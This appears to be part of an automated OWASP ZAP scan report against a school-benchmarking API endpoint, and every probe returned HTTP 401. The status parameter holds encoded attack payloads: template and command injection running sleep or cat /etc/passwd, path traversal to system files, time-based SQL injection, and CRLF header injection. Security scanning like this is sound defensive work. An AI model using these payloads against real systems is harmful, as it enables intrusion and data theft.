* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%253C%2521--&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%255Cuser-data&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%255CWEB-INF%255Cweb.xml&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%255D%255D%253E&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%257Bsystem%2528%2522sleep+15%2522%2529%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=0W45pz4p&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=1498374535918995670.owasp.org&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=5%253BURL%253D%2527https%253A%252F%252F1498374535918995670.owasp.org%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=any%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=any%253F%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=c%253A%252F&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=c%253A%252FWindows%252Fsystem.ini&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=c%253A%255C&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=c%253A%255CWindows%255Csystem.ini&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=cat+%252Fetc%252Fpasswd&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=di69vjci3kza4b703f75tv5e583buznwze29krhsdg2r306qat4bm7c8t158&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=g92gi7wyz18lnvhsu3ks1gv2cp7xdkb9liyg1tvfj9cmjbtffl04hr51&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=get-help&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=HhLDPYykcwSsljqQVAUaihrEfZADCbLTHqNpdApgOKFPUQKNFbmtRoUjltEQnUGJoZxOrgQnHIPjsfymFrVdFwoGlorVwqMFACUyhnelxfRVYYZEhaZdKGebiaUSEyAEqcrlHEkXKceToJkDlWoZJwqJNBTrZnWaRYGjtSTAyUGlshgWOIKWwnOEWlsscpbDwtMDMrVKcOSEwJAweQtdwSJCEhPKthnbmfRkBNFQABYJBlxSNoYsacLnQBBycRhZxeYhKhlNOPRCbZDOiqDvVDPUHhfMAdDHqJVlYiDNBDYhyNVnOwMoqHoidNHomoNyktOxarUCRhXsVmSiNeSIdeRshKVwHLqZRoCGjWiSZpAeJDUZgupVypUvDKExHYfxFfyZadgSVOmYVmhCFqBZhIIVgwkSNftCKCpRTYsOSnmJjpFjTidmZsIuuBIYNOInyJHYOcuGplrsNNtsWrSwDqUWQFNYRFXOWMgpDZRdHXaaWgiGPDMFwVNDoxTXvAdtFpXShjemwknhLDymoXLbWsFDwFsjXRqXBLdvpnWitxWgtFLUnkPSRQQqDapUDyPDjlrEohtmqXSJJSqtHhkadZhdjNieZRAiXkdvSIBSLTyYfMSTMdRQXnPaYPKHdxdDXEwOVatVCWflijyCdkmeRnHHfwQPkhJWyMFmpemEtkseKElqWCZdjEypOjOcgJHZMGCjpPCscfMYSquCFhCkbWKPlmMwtdCwvHmDELfIldDgJRMuIsePiYSKnahalfIInoHDpwMbYJjitBYdllWxJEUmVdAWdrORAdoPDTgPDbbuEUbWpPIGexQatTNldXcThvuEGEsNDscpxdmXtjfmfWHChnsfVNGbELDNvmfTNsxnZIDHPAMffInVRttLBJBsLmeeqhilvNTuyEOoTbuDxhmBRShDbkTWdQMPKWEVsCGFbcLVTCvycVwYyHARqfhWQxDmWSadXDRpCNdWNYnMJmpcGXCUGKpXFHWpoUxmRLHdcXCxEWeWYhsYuuoWbxSxbaKiiTcjxcUodJtnpoLGEwdFOrCWldeXQwASvBZELCqtsCnLsRMtFSpfwEwMnHABptgOLNkXxUNrpCKZldKsjNBeamJYnLGSRVuiJuuBnVsvbVsliFhGPpMUftfjUWpyuwZKeQgZyXNgbvOKTkmQgiMpFIdwZeFAcsybbrmjmlKwrtLyoBZGCaJDULblrqfpoENsEunOWFbeBVSDEjCYssIUpKWIhPletmsjYDkFfmaVVjtRGLBeCKDwZFGrfFaQcGHnOnyiUPJfGGXApDdCgKnPKPLXTQHMhWIFXuhxBZabvUouFaxMqodTZmvCZPVBwQikhFdZBMuYZYUVQaIkPlZsRfCrThFMeAHICqORiFKZYJDTvMZIgwJdnIsGebxMHFOQXjccByTYTiPKdJZMAQVcGBfjAvkTmIRwUWUbMrAFibNalthdnjWbWQyjsUDTBwdEMOKLBTSNlyUbyTKkfdNvmirWHVadlccWYuWXkjIWXZFCUPolxgCfFAajOArPhnDVDmovKYtwrhupOsbNPtioTZcTfYOkOXpbtkpaODgXubIuxDqQJRoYsUIRNhQgfwiMgRHvRsZeqAWYdagNdyBOgVtoCrDHCmBxMhlaaLhKvSKrnpIMbxRBnLbeGQgSoyILtuWWSXybaRYLciTUEvLLBtbrtLUEYqiSvkOVyQlvFcROScTxfAJYNlltxHmCsfEbuxMFaqVGVltYDmbGObwAeMpVVNOdXlSuCIHSApuAFpUOOGUAImfTtqthTWBGSCYLJnWxORpNxiLiqiAmcUwGhMSxuPRPUqEXFRZdykcurSTeWrtcDRmwDPFYKvbQJGhLNhDjBHMAbNXSHfBLdmUKMNxRGChyTpRQbnvDtPsOUPFiDVrSRMmvkVwEHiATMMVbsfGNOmpLKtyuFuNWwcEYdHNVEoSRoAWMNCBkDWmOCGHRyxRbBFLDkUVmGyUolbpayHOEBmmkXIKLZvOGsopOqEwElrajKUuDFmpESYgMfDYUQFoHwhXhcUuURbmkWeLmJQpWjyEJEiNdAxsUookKRbODMChivUUElJVFeZDDDoIecTZH&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=http%253A%252F%252F%255C1498374535918995670.owasp.org&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=http%253A%252F%252F1498374535918995670.owasp.org&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=http%253A%252F%252Fwww.google.com%252F&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=http%253A%252F%252Fwww.google.com%253A80%252F&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=http%253A%252F%252Fwww.google.com&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=https%253A%252F%252F%255C1498374535918995670.owasp.org&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=https%253A%252F%252F1498374535918995670%25252eowasp%25252eorg&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=https%253A%252F%252F1498374535918995670.owasp.org&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=iqa2ylwyfmmci4cxoy75ddly1jv1hyf9lm3zgt2tfsitjt34orxn2y91ncu&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%2526cat+%252Fetc%252Fpasswd%2526%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%2526sleep+15.0%2526%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%2526timeout+%252FT+15.0%2526%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%253Bget-help&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%253Bsleep+15.0%253B%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%253Bstart-sleep+-s+15.0&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%257Ctimeout+%252FT+15.0&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522+%252F+sleep%252815%2529+%252F+%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522+UNION+ALL+select+NULL+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
